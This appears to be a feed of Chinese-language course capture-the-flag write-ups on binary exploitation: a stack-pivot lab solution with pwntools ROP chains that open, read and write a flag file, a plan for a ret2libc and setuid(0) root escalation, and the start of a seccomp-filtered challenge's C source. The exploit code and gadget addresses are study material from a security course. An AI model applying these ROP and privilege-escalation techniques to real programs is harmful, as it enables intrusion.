&lt;p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall&lt;/p>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: Canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>GNU/Linux&lt;span style="color:#f92672">)&lt;/span>, statically linked, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>26fa8e6daa97baf7a26596ea91af5703dd932327, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫&lt;/li>
&lt;li>找gadget
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>leave_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401cfc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401832&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040f01e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448d27&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdx_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040173f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448280&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i 0x448280
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448280 &amp;lt;read+16&amp;gt;: syscall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; 0x448282 &amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448288 &amp;lt;read+24&amp;gt;: ja 0x4482e0 &amp;lt;read+112&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x44828a &amp;lt;read+26&amp;gt;: ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>會這樣的原因是我們在ROPgadget中找不到&lt;code>syscall ; ret&lt;/code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop&lt;/li>
&lt;li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
&lt;ol>
&lt;li>寫入的bss_addr和main_fn address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>bss_addr_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2700&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2800&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_write &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2900&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main_fn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401ce1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>trash_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(trash_payload &lt;span style="color:#f92672">+&lt;/span> p64(bss_addr_open) &lt;span style="color:#f92672">+&lt;/span> p64(main_fn))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到&lt;code>0x4c2700&lt;/code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>0x00007ffc884f3670│+0x0000: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span> ← $rsp, $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3678│+0x0008: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3680│+0x0010: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3688│+0x0018: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &amp;lt;transmem_list+0&amp;gt; add BYTE PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>, al ← $rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &amp;lt;main+12&amp;gt; lea rax, &lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>當main_fn執行完leave(&lt;code>mov rsp , rbp ; pop rbp ;&lt;/code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700&lt;/li>
&lt;li>觀察main_fn的assembly
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i &amp;amp;main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd5 &amp;lt;main&amp;gt;: endbr64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd9 &amp;lt;main+4&amp;gt;: push rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cda &amp;lt;main+5&amp;gt;: mov rbp,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cdd &amp;lt;main+8&amp;gt;: sub rsp,0x20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce1 &amp;lt;main+12&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce5 &amp;lt;main+16&amp;gt;: mov edx,0x80
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cea &amp;lt;main+21&amp;gt;: mov rsi,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ced &amp;lt;main+24&amp;gt;: mov edi,0x0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf2 &amp;lt;main+29&amp;gt;: call 0x448270 &amp;lt;read&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf7 &amp;lt;main+34&amp;gt;: mov eax,0x0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來&lt;/li>
&lt;li>寫入bss_addr_open
我們的目標是達成==fd = open(&amp;quot;/home/chal/flag.txt&amp;quot;, 0);==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>file_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/home/chal/flag.txt&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROP_open &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Open file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fd = open(&amp;#34;/home/chal/flag.txt&amp;#34;, 0);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr_open &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_open)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方&lt;/li>
&lt;li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_read &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Read the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read(fd, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">3&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_read)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_write &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Write the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># write(1, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_write)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行&lt;/p></description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</guid><description>&lt;h1 id="simple-pwn-0x362023-hw---notepad-stage-3">
 Simple PWN 0x36(2023 HW - Notepad-Stage 3)
 &lt;a class="anchor" href="#simple-pwn-0x362023-hw---notepad-stage-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程&lt;/p>
&lt;ol>
&lt;li>首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address&lt;/li>
&lt;li>知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop&lt;/li>
&lt;li>ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣&lt;/li>
&lt;/ol></description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</guid><description>&lt;h1 id="simple-pwn-0x372023-hw---hachama">
 Simple PWN 0x37(2023 HW - HACHAMA)
 &lt;a class="anchor" href="#simple-pwn-0x372023-hw---hachama">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>stack pivot
rop
bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;SECCOMP.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> msg[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span> seccompfilter[]&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, ArchField),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_JUMP(BPF_JMP &lt;span style="color:#f92672">|&lt;/span> BPF_JEQ &lt;span style="color:#f92672">|&lt;/span> BPF_K, AUDIT_ARCH_X86_64, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, SyscallNum),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(open),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(openat),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(read),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(write),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(close),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(readlink),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getdents),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getrandom),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(brk),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(rt_sigreturn),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit_group),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_fprog&lt;/span> filterprog&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.len&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(seccompfilter)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.filter&lt;span style="color:#f92672">=&lt;/span>seccompfilter
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">apply_seccomp&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_NO_NEW_PRIVS,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&lt;span style="color:#f92672">&amp;amp;&lt;/span>filterprog)&lt;span style="color:#f92672">==-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	apply_seccomp();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf2[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n2 = 0x30;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// char msg[0x20];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">char&lt;/span> name[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n = 20;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	n2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Haaton&amp;#39;s name? &amp;#34;&lt;/span>);
